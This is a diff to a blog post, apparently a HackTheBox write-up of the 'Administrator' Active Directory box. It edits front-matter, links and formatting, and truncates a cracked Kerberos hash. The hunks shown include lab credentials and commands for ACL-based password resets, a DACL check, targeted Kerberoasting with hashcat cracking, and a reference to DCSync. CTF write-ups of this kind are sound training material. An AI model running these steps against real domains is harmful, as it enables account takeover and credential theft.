@@ -1,15 +1,22 @@
 ---
-target_ip:
+title: "HTB: Administrator - AD Permission Chain to DCSync"
+date: 2026-06-15
+draft: false
+tags: ["Active Directory", "Windows", "HackTheBox", "ACL Abuse", "Kerberoasting", "DCSync"]
+categories: ["Writeups"]
+description: "Walkthrough of the Administrator Windows Active Directory box: chaining GenericAll, ForceChangePassword, a leaked Password Safe vault, GenericWrite, and targeted Kerberoasting into a DCSync attack for full domain compromise."
 os: Windows
 difficulty: Medium
-status:
-date: 2026-06-15
+status: Complete
+platforms: ["HackTheBox"]
+oses: ["Windows"]
+difficulties: ["Medium"]
 ---
 
-# 🚩 Box Name: {{Administrator}}
+# 🚩 Box Name: Administrator
 
 ## 📋 Initial Info
-- **Hostname:** `target.htb`
+- **Hostname:** `administrator.htb`
 
 ## Machine Overview
 
@@ -23,7 +30,7 @@ The final stages of the attack focus on abusing Active Directory permissions to 
 
 Administrator is an excellent example of how seemingly minor permission misconfigurations can compound into a complete Active Directory takeover when proper delegation and access controls are not carefully managed.
 
-As is common in real life Windows pentests, we start the Administrator box with credentials for the following account: 
+As is common in real life Windows pentests, we start the Administrator box with credentials for the following account:
 
 Username: Olivia Password: ichliebedich
 
@@ -157,7 +164,6 @@ Powered by @g0h4n_0
 RustHound-CE Enumeration Completed at 17:00:26 on 06/15/26! Happy Graphing!
 ```
 
-
 At first glance, Olivia didn't look particularly dangerous. However, BloodHound showed that she belonged to the **Remote Management Users** group, which meant I could authenticate over WinRM and get an interactive shell on the target.
 
 ```shell
@@ -177,9 +183,7 @@ The first interesting relationship was that **Olivia has GenericAll rights over 
 
 GenericAll is essentially the Active Directory equivalent of being handed someone's account keys. It grants full control over the target object, allowing actions such as resetting passwords, modifying attributes, and much more.
 
-
 ![BloodHound: Olivia GenericAll over Michael](/images/administrator/OtoMBH.png)
-
 
 #### Michael → Benjamin
 
@@ -189,11 +193,9 @@ Meaning if I can take over Michael, I can immediately take over Benjamin as well
 
 ![BloodHound: Michael ForceChangePassword over Benjamin](/images/administrator/MtoBBH.png)
 
-
 The attack path looked like this:
 
 ![BloodHound: full attack path overview](/images/administrator/OtoSBH.png)
-
 
 At this point I didn't see an obvious route to Domain Admin, but gaining access to additional accounts often uncovers new opportunities. Time to start collecting identities.
 
@@ -208,7 +210,6 @@ Using Olivia's GenericAll permissions, I reset Michael's password.
 └─❯ bloodyAD --host 10.129.13.134 -d administrator.htb -u olivia -p 'ichliebedich' set password michael 'Password123!'
 [+] Password changed successfully!
 ```
-
 
 Success.
 
@@ -225,7 +226,6 @@ Success again.
 Two account takeovers for the price of one.
 
 ### 📂 Benjamin's Secret FTP Stash
-
 
 With Benjamin compromised, I started checking what services he could access.
 
@@ -322,11 +322,9 @@ I next installed `passwordsafe`
 └─❯ sudo apt install passwordsafe 
 ```
 
-
 After opening the database with Password Safe, I found another set of credentials:
 
 ![Password Safe database showing Emily's credentials](/images/administrator/emilyDBpasswd.png)
-
 
 `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
 
@@ -346,9 +344,7 @@ Anyone with DCSync privileges can impersonate a Domain Controller and request pa
 
 The only challenge is getting control of Ethan's account.
 
-
-![[static/images/administrator/E to E.png]]
-
+![BloodHound: Emily GenericWrite over Ethan with DCSync rights](/images/administrator/emily-to-ethan-bh.png)
 
 #### Verifying the Permissions
 
@@ -358,7 +354,7 @@ I confirmed Emily's permissions using `dacledit.py`.
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Administrator]
-└─❯ dacledit.py -principal emily -target ethan adminstrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.13.134
+└─❯ dacledit.py -principal emily -target ethan administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.13.134
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Parsing DACL
@@ -382,13 +378,9 @@ One useful abuse of GenericWrite is a technique known as **Targeted Kerberoastin
 The idea is simple:
 
 1. Add a temporary SPN to the target account.
-
 2. Request a Kerberos service ticket for that SPN.
-
 3. Extract the ticket hash.
-
 4. Crack it offline.
-
 
 Since the ticket is encrypted using the target user's password hash, recovering the plaintext password becomes possible if it's weak enough.
 
@@ -404,7 +396,6 @@ The first attempt failed with a familiar Kerberos error:
 [!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
-
 Kerberos is notoriously picky about time synchronization.
 
 A quick time sync fixed the issue:
@@ -417,7 +408,6 @@ A quick time sync fixed the issue:
 CLOCK: time stepped by 25123.237019
 ```
 
-
 Running the attack again successfully produced a TGS hash for Ethan.
 
 ```shell
@@ -428,9 +418,7 @@ Running the attack again successfully produced a TGS hash for Ethan.
 [+] Writing hash to file for (ethan)
 ```
 
-
 #### 🔓 Cracking Ethan
-
 
 I used Hashcat once again.
 
@@ -441,7 +429,7 @@ hashcat (v6.2.6) starting
 
 <SNIP>
 
-$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$4f059d1cbb948619fd1e6de4f7524db9$224b9fb909d156d5b02ff3539caee7fb8d28f3a02b0954ff600e00f9d294d36750196aa72a5abfa148cae5e9a89d429b8a9151102f96ffc7785582a49fb529c36625d20f7e85123f2fc6154d2a7b42dadff01b60a818678ea7f5f85fbeeacc8c76088bc59042664f44facccd57af02b536625863a978aa74be40f08d9ddcac6de07890bcc8a1fd13c9401f4813dfc243a09466ad857404f765609aed8ebed1e5ce4936a11a6f8fb8a24ba3dbf486a3d6bc36b5940a03d82dd366ac8f8ae1dfdffe2c5a46ed0ffe068899b448f907fd53bbd28fde24f6edc5711b07de5cfb2b86dfe58d5d58f7a6b8e5d500775a18f4af0137584ad937d54b7713de819dfe2d77188ff35f45d325bc1f2586f205391e51215dcb3337c4ef8fc3f380ddfd7a6b10e7a987f2a7e19861500d232812fcbffae99483868db619af6a14d365ddf1dd66c32e93652677b3f3afb80d42aa62945061624e4b566ea84ab79b01933186b237e9ef68d39afa61eb0d26f2c578d7024d955322841aafc8a1fc572aeaf0a7a3d3d5f0c7eefe95b0fbee2b1376fb0ed34c4b513ff0de6b4038e2248c79b0ae3b73779098a628aa3cb59b43bd1b15908d70b6c504b31a0616d5e593cd8c927383efdbb0cb10fedb46d7942b84044a89402a52070ad881332c7de3163d7b419dc20235b34c0f4c1f5dd7cbd6d32f600c144782daf868f15e3bfcfbd4ccb1929a012318023b1d2ce2871cfec81a9404264acde06d682c3b506eeb50362357fb1d6386eec940264ee02e9148fcf85b4ddfddb2c5053df4ef7867541f7b2f0e8278221cb2e165688df9808ad61e3dcbd0190b7df393078b7038e71b6bc7a02f24bef44db08852805572dec4277830402207c3cb2d2ee01b665fe0ce60fa877c9d33681a6bf70b542e75d2be0cdd00b59721443cc7893c81ad90706a7c3254f7827a2fc540bde5538a09b76d11db85ee19a25f7cc59f8b7fd94ae77c069a2f0f2033aa08e8701d1ac62ee7d4f4460ebec34a313c3f304cc8b45d3929f1ba844f49b04048e3fbf50435804bf6e9e71f0655deef11ae9aa5af0c056720393a5b20009b8b60801aacad28afb6339209246e0e3ad1690366c76adb6143021517fea20821f03747c955899f6469d49b473512b77118e03281b83d14dd353252a0450f478991141a9fcef159bfa462715b61870d6800e2e33f71cd69dea490e47af029faa62925743830d76f3f69cf4e0d66ba4bf34f8136dbf638e9dc24881d048d718c264ed0951dd1e15cfc966ba9b9e2031803140b221fffec2ce29dc512f25fe4bcf349196944aa0fdfa82e8d8f92d08048e24e6a3584ef0dcb0175f1e81adb9fe3bbbab1794f29b5a38b9867b66af2b19975be8461210078dec45627a7b5e8c659bee007511fe3c47f3c9500d920db61dad24391313daa2a1639269a502da26e876e49a66bb024e003f6f757de7d4a66c812b4b107bb7498cb4396bee92f7e2b4c873c1f8750b5626a7927bef20852b9e0845f7aa9b3ea306cf0053508d8330c08c986:limpbizkit
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$4f059d1cbb948619fd1e6de4f7524db9$<SNIP>:limpbizkit
 
 Session..........: hashcat
 Status...........: Cracked
@@ -465,7 +453,6 @@ Hardware.Mon.#1..: Util: 99%
 Started: Tue Jun 16 01:36:30 2026
 Stopped: Tue Jun 16 01:36:34 2026
 ```
-
 
 Apparently the domain's password policy was feeling particularly nostalgic.
 
@@ -538,7 +525,6 @@ Using the recovered Administrator credentials, I authenticated to the Domain Con
 administrator\administrator
 ```
 
-
 The entire attack path looked like this:
 
 ```text
@@ -556,5 +542,3 @@ Administrator
 ```
 
 The real challenge was following the breadcrumbs and abusing each permission along the way.
-
-The End
